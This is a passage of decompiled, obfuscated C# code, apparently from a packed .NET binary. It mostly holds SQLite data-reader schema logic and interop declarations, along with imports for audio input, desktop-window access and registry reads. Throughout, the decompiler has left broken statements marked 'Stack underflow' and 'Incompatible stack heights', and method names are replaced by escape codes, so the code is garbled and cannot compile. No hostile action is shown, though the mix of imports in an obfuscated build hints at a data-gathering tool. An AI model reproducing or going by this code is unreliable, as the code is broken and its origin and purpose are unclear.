						catch (SQLiteException)
						{
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static global::_0005._0003 _0001(Stream _0002)
		{
			//IL_0007: Incompatible stack heights: 0 vs 2
			//IL_000e: Incompatible stack heights: 0 vs 1
			_ = 1;
			_0018._0001((byte)/*Error near IL_000e: Stack underflow*/ != 0, (Stream)/*Error near IL_000e: Stack underflow*/);
			return (global::_0005._0003)/*Error near IL_0006: Stack underflow*/;
		}

		[DllImport("winmm.dll", EntryPoint = "waveInClose")]
		static extern MmResult _0001(IntPtr _0002);

		static void _0001(global::_0007._001E P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((global::_0007._001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0017._0015 _0001(string _0002)
		{
			//IL_0061: Incompatible stack heights: 0 vs 4
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			_ = _0019_0005._007E_0003_000F;
			_ = Registry.LocalMachine;
			_ = global::_000F._008B_0002;
			_0080._0014._0001(107359143);
			/*Error near IL_006b: Stack underflow*/((string)/*Error near IL_006b: Stack underflow*/, (string)/*Error near IL_006b: Stack underflow*/);
			return _0018._0001(new Guid((/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, (string)/*Error near IL_001f: Stack underflow*/) ?? throw new ArgumentException(_0008_0002._0007_0005(_0080._0014._0001(107359154), _0002))).GetValue(_0080._0014._0001(107359081))!.ToString()));
		}

		static double _0001(byte[] _0002)
		{
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00fc: Incompatible stack heights: 0 vs 1
			if (((Array)/*Error near IL_0006: Stack underflow*/).Length != 10)
			{
				_0080._0014._0001(107359072);
				new Exception((string?)/*Error near IL_00fc: Stack underflow*/);
				throw /*Error near IL_001b: Stack underflow*/;
			}
			int num = ((_0002[0] & 0x7F) << 8) | _0002[1];
			uint num2 = (uint)((_0002[2] << 24) | (_0002[3] << 16) | (_0002[4] << 8) | _0002[5]);
			uint num3 = (uint)((_0002[6] << 24) | (_0002[7] << 16) | (_0002[8] << 8) | _0002[9]);
			double num4;
			if (num == 0 && num2 == 0 && num3 == 0)
			{
				num4 = 0.0;
			}
			else if (num == 32767)
			{
				num4 = double.NaN;
			}
			else
			{
				num -= 16383;
				num4 = _0018._0001((double)((long)num2 - 2147483647L - 1) + 2147483648.0, num -= 31);
				num4 += _0018._0001((double)((long)num3 - 2147483647L - 1) + 2147483648.0, num -= 32);
			}
			if ((_0002[0] & 0x80) == 128)
			{
				return 0.0 - num4;
			}
			return num4;
		}

		static DataTable _0001(_0014 _0002, bool _0003, bool P_2)
		{
			//IL_0e3d: Incompatible stack heights: 0 vs 1
			//IL_0e4d: Incompatible stack heights: 0 vs 1
			if (5u != 0)
			{
				_0018._0001((_0014)/*Error near IL_0e47: Stack underflow*/);
			}
			_ = ((_0014)/*Error near IL_0016: Stack underflow*/)._0002;
			Dictionary<_0014._0001, List<int>> dictionary = null;
			Dictionary<int, _0014._0001> dictionary2 = null;
			_0013 obj = _0002._0001.Connection._0001;
			global::_0013._0017 obj2 = _0002._0001;
			int num = _0002._0004;
			_0018._0001(num, ref dictionary, ref dictionary2, obj2, obj);
			DataTable dataTable = new DataTable(_0080._0014._0001(107359023));
			DataTable dataTable2 = null;
			string text = string.Empty;
			string text2 = string.Empty;
			string empty = string.Empty;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.ColumnName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.ColumnOrdinal, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.ColumnSize, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.NumericPrecision, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.NumericScale, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.IsUnique, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.IsKey, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.BaseServerName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.BaseCatalogName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.BaseColumnName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.BaseSchemaName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.BaseTableName, _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.DataType, _0091._0080_0004(typeof(Type).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.AllowDBNull, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.ProviderType, _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.IsAliased, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.IsExpression, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.IsAutoIncrement, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.IsRowVersion, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.IsHidden, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableColumn.IsLong, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.IsReadOnly, _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.ProviderSpecificDataType, _0091._0080_0004(typeof(Type).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), SchemaTableOptionalColumn.DefaultValue, _0091._0080_0004(typeof(object).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359181), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359196), _0091._0080_0004(typeof(string).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			for (int i = 0; i < _0002._0004; i++)
			{
				_001F._0018 obj3 = _0018._0001(_0002, _0002._0001, i);
				DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
				DbType dbType = obj3._0001;
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnName, _009E_0003._007E_0002_0008(_0002, i));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnOrdinal, i);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnSize, _0018._0001(dbType));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericPrecision, _0018._0001(dbType));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericScale, _0018._0001(dbType));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ProviderType, obj3._0001);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsLong, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.AllowDBNull, true);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsReadOnly, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsRowVersion, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsUnique, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsKey, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsAutoIncrement, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.DataType, _001A_0005._007E_0004_000F(_0002, i));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsHidden, false);
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.BaseSchemaName, _0002._0001);
				empty = dictionary2[i]._0003;
				if (!global::_001C._0096_0003(empty))
				{
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.BaseColumnName, empty);
				}
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsExpression, global::_001C._0096_0003(empty));
				_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsAliased, _009D_0003._009D_0007(_009E_0003._007E_0002_0008(_0002, i), empty, StringComparison.OrdinalIgnoreCase) != 0);
				string text3 = dictionary2[i]._0002;
				if (!global::_001C._0096_0003(text3))
				{
					_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.BaseTableName, text3);
				}
				text3 = dictionary2[i]._0001;
				if (!global::_001C._0096_0003(text3))
				{
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName, text3);
				}
				string text4 = null;
				if (!global::_001C._0096_0003(empty))
				{
					string text5 = null;
					bool flag = false;
					bool flag2 = false;
					bool flag3 = false;
					_0002._0001.Connection._0001._0001((string)_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName), (string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName), empty, ref text4, ref text5, ref flag, ref flag2, ref flag3);
					if (flag || flag2)
					{
						_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.AllowDBNull, false);
					}
					dataRow[SchemaTableColumn.IsKey] = flag2 && _0014._0001(dictionary) <= 1;
					_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.IsAutoIncrement, flag3);
					_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107359196), text5);
					string[] array = global::_000E._007E_008A_0002(text4, new char[1] { '(' });
					if (array.Length > 1)
					{
						text4 = array[0];
						array = global::_000E._007E_008A_0002(array[1], new char[1] { ')' });
						if (array.Length > 1)
						{
							array = global::_000E._007E_008A_0002(array[0], new char[2] { ',', '.' });
							if (obj3._0001 == DbType.Binary || _0018._0001(obj3._0001))
							{
								_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.ColumnSize, _0018_0004._0083_0008(array[0], _008F_0003._008B_0007()));
							}
							else
							{
								_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericPrecision, _0018_0004._0083_0008(array[0], _008F_0003._008B_0007()));
								if (array.Length > 1)
								{
									_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.NumericScale, _0018_0004._0083_0008(array[1], _008F_0003._008B_0007()));
								}
							}
						}
					}
					if (P_2)
					{
						global::_0010._001C obj4 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107359038), new object[2]
						{
							_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName),
							_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName)
						}), _0002._0001.Connection);
						try
						{
							DbDataReader dbDataReader = _0018._0001(obj4);
							try
							{
								while (global::_001B._007E_008F_0003(dbDataReader))
								{
									if (_009D_0003._009D_0007((string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseColumnName), _009E_0003._007E_0001_0008(dbDataReader, 1), StringComparison.OrdinalIgnoreCase) == 0)
									{
										if (!_0008_0005._007E_0091_000E(dbDataReader, 4))
										{
											_0083_0004._007E_0093_0008(dataRow, SchemaTableOptionalColumn.DefaultValue, _008F_0004._007E_0016_000E(dbDataReader, 4));
										}
										break;
									}
								}
							}
							finally
							{
								if (dbDataReader != null)
								{
									global::_0008._007E_0098(dbDataReader);
								}
							}
						}
						finally
						{
							if (obj4 != null)
							{
								global::_0008._007E_0098(obj4);
							}
						}
					}
					if (_0003)
					{
						if (_0010_0003._008C_0006((string)_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName), text) || _0010_0003._008C_0006((string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName), text2))
						{
							text = (string)_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName);
							text2 = (string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName);
							dataTable2 = _001E_0004._007E_008B_0008(_0002._0001.Connection, _0080._0014._0001(107358997), new string[4]
							{
								(string)_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName),
								null,
								(string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName),
								null
							});
						}
						IEnumerator enumerator = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(dataTable2));
						try
						{
							while (global::_001B._007E_0086_0003(enumerator))
							{
								DataRow dataRow2 = (DataRow)_0083_0003._007E_001D_0007(enumerator);
								DataTable dataTable3 = _001E_0004._007E_008B_0008(_0002._0001.Connection, _0080._0014._0001(107362428), new string[5]
								{
									(string)_0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.BaseCatalogName),
									null,
									(string)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseTableName),
									(string)_0006_0004._007E_0010_0008(dataRow2, _0080._0014._0001(107362723)),
									null
								});
								IEnumerator enumerator2 = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(dataTable3));
								try
								{
									while (global::_001B._007E_0086_0003(enumerator2))
									{
										DataRow dataRow3 = (DataRow)_0083_0003._007E_001D_0007(enumerator2);
										if (_009D_0003._009D_0007(_0018._0001(_0006_0004._007E_0010_0008(dataRow3, _0080._0014._0001(107362765))), empty, StringComparison.OrdinalIgnoreCase) == 0)
										{
											if (dictionary.Count == 1 && global::_001A._007E_001E_0003(_0006_0005._007E_008F_000E(dataTable3)) == 1 && !(bool)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.AllowDBNull))
											{
												_0083_0004._007E_0093_0008(dataRow, SchemaTableColumn.IsUnique, _0006_0004._007E_0010_0008(dataRow2, _0080._0014._0001(107358816)));
											}
											if (global::_001A._007E_001E_0003(_0006_0005._007E_008F_000E(dataTable3)) == 1 && (bool)_0006_0004._007E_0010_0008(dataRow2, _0080._0014._0001(107358899)) && !global::_001C._0096_0003(text4) && _009D_0003._009D_0007(text4, _0080._0014._0001(107358440), StringComparison.OrdinalIgnoreCase) != 0)
											{
											}
											break;
										}
									}
								}
								finally
								{
									if (enumerator2 is IDisposable disposable)
									{
										global::_0008._007E_0098(disposable);
									}
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable disposable2)
							{
								global::_0008._007E_0098(disposable2);
							}
						}
					}
					if (global::_001C._0096_0003(text4))
					{
						global::_0014._0017 obj5 = global::_0014._0017._0001;
						text4 = _0002._0001._0001._0001(_0002._0001, i, ref obj5);
					}
					if (!global::_001C._0096_0003(text4))
					{
						_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107359181), text4);
					}
				}
				_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
			}
			if (_0002._0001 != null)
			{
				_0018._0001(_0002._0001, dataTable);
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_int64")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, long _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_value")]
		static extern void _0001(IntPtr _0002, IntPtr _0003);

		static void _0001(global::_0016._0007 _0002, Exception P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new global::_0016._0007._0001();
			global::_0016._0007._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (global::_0016._0007._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((global::_0016._0007._0001)/*Error near IL_000e: Stack underflow*/)._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (_0002._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(_0002, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(_0002._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((global::_0016._0007._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((global::_0016._0007._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((global::_0016._0007._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "interop_compileoption_get")]
		static extern IntPtr _0001(int _0002);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_free")]
		static extern void _0001(IntPtr _0002);

		static double _0001(DateTime _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			_0018._0001((DateTime)/*Error near IL_0019: Stack underflow*/);
			return (double)/*Error near IL_0005: Stack underflow*/ / 86400000.0;
		}

		static void _0001(_0080._0017 _0002, global::_0017._0080 _0003, string P_2)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0033: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107358459));
			}
			_0003._0001._0001(_0002, P_2);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_rekey")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, int _0004);

		static global::_0001._0004 _0001(global::_0005._0005 _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			new global::_0015._0007((global::_0005._0005)/*Error near IL_000d: Stack underflow*/);
			return (global::_0001._0004)/*Error near IL_0005: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "interop_sourceid")]
		static extern IntPtr _0001();

		static string[] _0001(string _0002, char _0003)
		{
			//IL_01f3: Incompatible stack heights: 0 vs 1
			//IL_01fa: Incompatible stack heights: 0 vs 1
			char[] array = new char[2];
			((short[])/*Error near IL_0014: Stack underflow*/)[0] = 34;
			((short[])/*Error near IL_001c: Stack underflow*/)[1] = (short)_0003;
			char[] array2 = array;
			char[] array3 = new char[1] { '"' };
			int num = 0;
			List<string> list = new List<string>();
			while (global::_001A._007E_0016_0003(_0002) > 0)
			{
				num = _001B_0005._007E_0005_000F(_0002, array2, num);
				if (num == -1)
				{
					break;
				}
				if (_009F_0004._007E_0088_000E(_0002, num) == array2[0])
				{
					num = _001B_0005._007E_0005_000F(_0002, array3, num + 1);
					if (num == -1)
					{
						break;
					}
					num++;
					continue;
				}
				string text = global::_0002._007E_000F(_0087_0002._007E_008F_0005(_0002, 0, num));
				if (global::_001A._007E_0016_0003(text) > 1 && _009F_0004._007E_0088_000E(text, 0) == array3[0] && _009F_0004._007E_0088_000E(text, global::_001A._007E_0016_0003(text) - 1) == _009F_0004._007E_0088_000E(text, 0))
				{
					text = _0087_0002._007E_008F_0005(text, 1, global::_001A._007E_0016_0003(text) - 2);
				}
				_0002 = global::_0002._007E_000F(_009E_0003._007E_009E_0007(_0002, num + 1));
				if (global::_001A._007E_0016_0003(text) > 0)
				{
					list.Add(text);
				}
				num = 0;
			}
			if (global::_001A._007E_0016_0003(_0002) > 0)
			{
				string text = global::_0002._007E_000F(_0002);
				if (global::_001A._007E_0016_0003(text) > 1 && _009F_0004._007E_0088_000E(text, 0) == array3[0] && _009F_0004._007E_0088_000E(text, global::_001A._007E_0016_0003(text) - 1) == _009F_0004._007E_0088_000E(text, 0))
				{
					text = _0087_0002._007E_008F_0005(text, 1, global::_001A._007E_0016_0003(text) - 2);
				}
				list.Add(text);
			}
			string[] array4 = new string[list.Count];
			list.CopyTo(array4, 0);
			return array4;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
		static extern IntPtr _0001();

		static DateTime _0001(DateTime? _0002, long _0003)
		{
			//IL_010a: Incompatible stack heights: 0 vs 1
			//IL_0114: Incompatible stack heights: 0 vs 1
			//IL_011e: Incompatible stack heights: 0 vs 1
			_0018._0001((long)/*Error near IL_0114: Stack underflow*/);
			if ((int)/*Error near IL_000c: Stack underflow*/ == 0)
			{
				_ = _0002.HasValue;
				if ((int)/*Error near IL_0015: Stack underflow*/ == 0)
				{
					throw new ArgumentException(_0080._0014._0001(107358390));
				}
				return _0002.Value;
			}
			int num = (int)((_0003 + 43200000) % 86400000);
			decimal num2 = (decimal)num / 1000.0m;
			num = (int)num2;
			int millisecond = (int)((num2 - (decimal)num) * 1000.0m);
			num2 -= (decimal)num;
			int num3 = num / 3600;
			num -= num3 * 3600;
			int num4 = num / 60;
			num2 += (decimal)(num - num4 * 60);
			int second = (int)num2;
			try
			{
				DateTime minValue = DateTime.MinValue;
				return new DateTime(minValue.Year, minValue.Month, minValue.Day, num3, num4, second, millisecond);
			}
			catch
			{
				if (!_0002.HasValue)
				{
					throw;
				}
				return _0002.Value;
			}
		}

		static void _0001(float[] _0002, float[] _0003, global::_000E._0019 _0004, int _0005, int _0006, double _0007, float[] _0008, int _000E, int _000F, int P_9)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected F8, but got Unknown
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00c2: Incompatible stack heights: 0 vs 1
			int num = ((global::_000E._0019)/*Error near IL_000a: Stack underflow*/)._0007;
			_0007 = /*Error near IL_0017: Stack underflow*/* (double)num;
			int num2 = (int)_0007;
			_000E += num - 1 - num2;
			_0007 -= (double)num2;
			for (int i = 0; i < P_9; i++)
			{
				double num3 = 0.0;
				double num4 = 0.0;
				int num5 = _000E;
				int num6 = _0005 + i;
				int num7 = _0006;
				while (num7-- != 0)
				{
					num3 += (double)(_0008[num5] * _0003[num6]);
					num4 += (double)(_0008[num5 + 1] * _0003[num6]);
					num6 += P_9;
					num5 += num;
				}
				_0002[_000F + i] = (float)(num3 * _0007 + num4 * (1.0 - _0007));
			}
		}

		static void _0001(global::_0004._0016 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0004._0016)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0004._0016).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(global::_000E._0005 _0002, Exception P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new global::_000E._0005._0001();
			global::_000E._0005._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (global::_000E._0005._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((global::_000E._0005._0001)/*Error near IL_000e: Stack underflow*/)._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (_0002._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(_0002, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(_0002._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((global::_000E._0005._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((global::_000E._0005._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((global::_000E._0005._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_config")]
		static extern _0080._0017 _0001(IntPtr _0002, global::_0003._0013 _0003, int _0004, ref int _0005);

		static void _0001(_001A._0018 P_0)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			IntPtr zero = IntPtr.Zero;
			((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001 = zero;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(DbType _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			DbType dbType = (DbType)/*Error near IL_0029: Stack underflow*/;
			if ((int)/*Error near IL_0009: Stack underflow*/ != 0)
			{
				switch (dbType)
				{
				case DbType.String:
				case DbType.AnsiStringFixedLength:
				case DbType.StringFixedLength:
					break;
				default:
					return false;
				}
			}
			return true;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_table_name16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static void _0001(double _0002 = 0.0, global::_000E._0019 P_1)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			((global::_000E._0019)/*Error near IL_0008: Stack underflow*/)._0004 = 0;
			((global::_000E._0019)/*Error near IL_0010: Stack underflow*/)._0005 = 0;
			((global::_000E._0019)/*Error near IL_0018: Stack underflow*/)._0004 = _0002;
			P_1._0006 = 0;
			if (P_1._0001 != null)
			{
				P_1._0001._0001 = new double[256, 4];
			}
		}

		static string _0001(string _0002, string _0003)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if ((int)/*Error near IL_0008: Stack underflow*/ != 0)
				{
					_ = global::_000F._008C_0002;
					return /*Error near IL_0015: Stack underflow*/((string)/*Error near IL_0015: Stack underflow*/, _0003);
				}
				return _0002;
			}
			if (_0003 != null)
			{
				return _0003;
			}
			return null;
		}

		static void _0001(_0019._0005 P_0)
		{
			//IL_0071: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 2
